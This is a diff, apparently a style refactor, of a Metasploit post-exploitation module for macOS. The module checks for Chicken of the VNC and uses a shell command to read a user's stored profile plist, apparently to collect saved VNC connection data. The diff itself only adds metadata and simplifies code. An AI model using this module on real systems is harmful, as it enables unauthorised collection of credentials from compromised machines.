@@ -19,7 +19,12 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'sinn3r'],
         'Platform' => [ 'osx' ],
-        'SessionTypes' => [ 'meterpreter', 'shell' ]
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -35,7 +40,7 @@ class MetasploitModule < Msf::Post
   def exec(cmd)
     tries = 0
     begin
-      out = cmd_exec(cmd).chomp
+      cmd_exec(cmd).chomp
     rescue ::Timeout::Error => e
       tries += 1
       if tries < 3
@@ -61,8 +66,7 @@ class MetasploitModule < Msf::Post
 
   def locate_chicken
     dir('/Applications/').each do |folder|
-      m = folder.match(/Chicken of the VNC\.app/)
-      return true
+      return true if folder.match(/Chicken of the VNC\.app/)
     end
 
     return false
@@ -70,11 +74,12 @@ class MetasploitModule < Msf::Post
 
   def get_profile_plist(user)
     f = exec("cat /Users/#{user}/Library/Preferences/com.geekspiff.chickenofthevnc.plist")
+
     if f =~ /No such file or directory/
       return nil
-    else
-      return f
     end
+
+    f
   end
 
   def save(file)
@@ -96,9 +101,9 @@ class MetasploitModule < Msf::Post
     if !locate_chicken
       print_error("#{@peer} - Chicken of the VNC is not installed")
       return
-    else
-      print_status("#{@peer} - Chicken of the VNC found")
     end
+
+    print_status("#{@peer} - Chicken of the VNC found")
 
     plist = get_profile_plist(user)
     if plist.nil?
